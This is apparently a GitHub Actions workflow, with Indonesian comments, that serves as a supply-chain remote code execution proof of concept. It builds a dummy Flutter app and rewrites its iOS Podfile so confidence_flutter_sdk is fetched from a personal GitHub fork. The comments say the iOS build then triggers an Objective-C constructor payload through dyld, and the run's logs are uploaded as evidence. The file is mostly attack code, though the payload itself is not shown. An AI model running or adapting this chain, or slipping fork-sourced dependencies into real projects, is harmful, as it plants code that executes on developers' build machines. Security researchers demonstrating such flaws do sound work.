name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain
        run: |
          # 0. NUCLEAR RESET: Hapus folder project lama biar gak ada cache zombie
          rm -rf rce_test
          
          # 1. Create fresh dummy project
          flutter create rce_test
          cd rce_test
          flutter pub add confidence_flutter_sdk
          
          # 2. Patch Platform Version ke 16.0
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
          
          # 3. DIRECT GIT BYPASS (The Guerilla Route)
          # Bunuh logic otomatis Flutter agar tidak terkunci ke symlink lokal
          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
          
          # PAKSA ambil dari branch main. Bodo amat sama CDN Trunk yang lemot!
          echo "pod 'confidence_flutter_sdk', :git => 'https://github.com/ilhamal7/confidence-sdk-flutter.git', :branch => 'main'" >> ios/Podfile
          
          echo "=== Podfile AFTER Guerilla Patch (Direct Git) ==="
          cat ios/Podfile
          
          cd ios
          # 4. CLEANUP PROTOCOL
          echo "=== Purging Old Pods and Locks ==="
          pod cache clean --all
          rm -rf Pods
          rm -rf Podfile.lock
          
          # Jalankan install secara verbose untuk debugging
          pod install --verbose 2>&1 | tee pod_install.log || true
          
          echo "=== Check Podfile.lock Status ==="
          # Jika gagal di sini, cek pod_install.log untuk error spesifik dari CocoaPods
          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING - CHECK LOGS ABOVE"
          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE 2.0.0"
          
          cd ..
          # 5. Build Phase - Execution Phase (Trigger Payload)
          # dyld akan load library dan mentrigger Objective-C constructor lu
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Build log tail ==="
          tail -30 build.log

      - name: Upload Logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-evidence
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
